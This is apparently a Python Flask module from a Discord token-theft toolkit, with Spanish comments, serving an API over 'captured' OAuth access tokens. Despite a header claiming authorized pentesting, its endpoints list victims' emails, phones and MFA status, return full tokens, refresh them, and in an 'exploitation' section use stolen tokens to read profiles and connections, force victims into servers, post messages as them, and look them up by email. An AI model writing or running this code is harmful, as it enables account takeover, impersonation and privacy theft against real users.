# api_endpoints.py
# Endpoints REST para interactuar con los tokens capturados
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

from flask import Blueprint, request, jsonify
import requests
import logging
import datetime
from token_manager import token_manager
from config import config

logger = logging.getLogger("APIEndpoints")
api = Blueprint("api", __name__)

# ==================== ENDPOINTS DE GESTIÓN ====================

@api.route("/api/tokens", methods=["GET"])
def list_all_tokens():
    guild_id = request.args.get("guild_id")
    tokens = token_manager.get_all_tokens(guild_id)
    safe_tokens = []
    for t in tokens:
        safe_tokens.append({
            "user_id": t.get("user_id"),
            "username": t.get("username"),
            "email": t.get("email"),
            "phone": t.get("phone"),
            "mfa_enabled": t.get("mfa_enabled"),
            "premium_type": t.get("premium_type"),
            "verified": t.get("verified"),
            "locale": t.get("locale"),
            "captured_at": t.get("captured_at"),
            "expires_at": t.get("expires_at"),
            "guild_id": t.get("guild_id"),
            "user_guilds_count": len(t.get("user_guilds", [])),
            "token_preview": (t.get("access_token", "")[:30] + "...") if t.get("access_token") else None
        })
    return jsonify({"count": len(safe_tokens), "tokens": safe_tokens})

@api.route("/api/token/<user_id>", methods=["GET"])
def get_user_token(user_id):
    token = token_manager.get_token(user_id)
    if token:
        return jsonify(token)
    return jsonify({"error": "Token no encontrado"}), 404

@api.route("/api/token/<user_id>/refresh", methods=["POST"])
def refresh_user_token(user_id):
    token = token_manager.get_token(user_id)
    if not token:
        return jsonify({"error": "Token no encontrado"}), 404
    refreshed = token_manager.refresh_token(token)
    if refreshed:
        token_manager.add_token(refreshed)
        return jsonify({"status": "refreshed", "expires_at": refreshed.get("expires_at")})
    return jsonify({"error": "No se pudo refrescar"}), 500

@api.route("/api/stats", methods=["GET"])
def get_stats():
    return jsonify(token_manager.get_stats())

@api.route("/api/cleanup", methods=["POST"])
def cleanup():
    removed = token_manager.cleanup_expired()
    return jsonify({"removed": removed})

# ==================== ENDPOINTS DE EXPLOTACIÓN ====================

@api.route("/api/use/<user_id>", methods=["GET"])
def use_token(user_id):
    token_data = token_manager.get_token(user_id)
    if not token_data:
        return jsonify({"error": "Token no encontrado"}), 404
    access_token = token_data.get("access_token")
    if not access_token:
        return jsonify({"error": "Token sin access_token"}), 500
    headers = {"Authorization": f"Bearer {access_token}"}
    base = "https://discord.com/api/v9"
    result = {}
    r = requests.get(f"{base}/users/@me", headers=headers, timeout=10)
    if r.status_code == 200:
        result["profile"] = r.json()
    else:
        result["profile_error"] = r.status_code
    r = requests.get(f"{base}/users/@me/connections", headers=headers, timeout=10)
    if r.status_code == 200:
        connections = r.json()
        result["connections"] = [
            {"type": c.get("type"), "name": c.get("name"), "verified": c.get("verified")}
            for c in connections
        ]
    r = requests.get(f"{base}/users/@me/guilds", headers=headers, timeout=10)
    if r.status_code == 200:
        guilds = r.json()
        result["guilds"] = [
            {"id": g["id"], "name": g["name"], "owner": g.get("owner", False)}
            for g in guilds
        ]
    return jsonify(result)

@api.route("/api/join/<user_id>/<guild_id>", methods=["POST"])
def join_guild(user_id, guild_id):
    token_data = token_manager.get_token(user_id)
    if not token_data:
        return jsonify({"error": "Token no encontrado"}), 404
    access_token = token_data.get("access_token")
    join_url = f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}"
    headers = {"Authorization": f"Bot {config.BOT_TOKEN}", "Content-Type": "application/json"}
    data = {"access_token": access_token}
    r = requests.put(join_url, json=data, headers=headers, timeout=10)
    if r.status_code in (200, 201, 204):
        return jsonify({"status": "joined", "guild_id": guild_id})
    return jsonify({"error": f"HTTP {r.status_code}", "detail": r.text[:200]}), 400

@api.route("/api/message/<user_id>", methods=["POST"])
def send_as_user(user_id):
    data = request.json
    channel_id = data.get("channel_id")
    content = data.get("content", "Mensaje de prueba - Pentest Autorizado")
    token_data = token_manager.get_token(user_id)
    if not token_data:
        return jsonify({"error": "Token no encontrado"}), 404
    headers = {"Authorization": f"Bearer {token_data['access_token']}"}
    r = requests.post(
        f"https://discord.com/api/v9/channels/{channel_id}/messages",
        json={"content": content},
        headers=headers,
        timeout=10
    )
    if r.status_code == 200:
        return jsonify({"status": "sent", "message_id": r.json().get("id")})
    return jsonify({"error": f"HTTP {r.status_code}", "detail": r.text[:200]}), 400

@api.route("/api/search", methods=["POST"])
def search_by_email():
    data = request.json
    email_query = data.get("email", "").lower()
    all_tokens = token_manager.get_all_tokens()
    matches = [t for t in all_tokens if t.get("email") and email_query in t["email"].lower()]
    return jsonify({
        "query": email_query,
        "matches": len(matches),
        "users": [{"user_id": t["user_id"], "username": t["username"], "email": t["email"]} for t in matches]
    })

@api.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "tokens_captured": token_manager.get_stats()["total"],
        "timestamp": str(datetime.datetime.now())
    })
